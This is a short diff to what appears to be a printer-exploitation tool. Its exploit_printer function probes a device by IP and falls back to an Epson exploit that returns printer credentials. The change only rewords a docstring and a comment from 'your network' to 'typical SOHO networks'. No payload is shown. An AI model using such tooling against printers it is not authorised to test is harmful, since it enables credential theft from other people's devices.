@@ -347,7 +347,7 @@ def _parse_generic_printer_page(html: str, creds: PrinterCredentials, category: 
 def exploit_printer(ip: str, timeout: float = 3.0) -> PrinterCredentials:
     """Auto-detect printer type and run appropriate exploit.
 
-    Tries Epson first (based on your network), then HP, then generic.
+    Tries Epson first (most common unauthenticated exposure in typical SOHO networks), then HP, then generic.
     """
     # Quick probe to detect printer type
     client = httpx.Client(timeout=timeout, verify=False, follow_redirects=True)
@@ -365,5 +365,5 @@ def exploit_printer(ip: str, timeout: float = 3.0) -> PrinterCredentials:
         pass
     client.close()
 
-    # Default to Epson (most common in your network)
+    # Default to Epson (most common unauthenticated exposure in typical SOHO networks)
     return exploit_epson(ip, timeout)
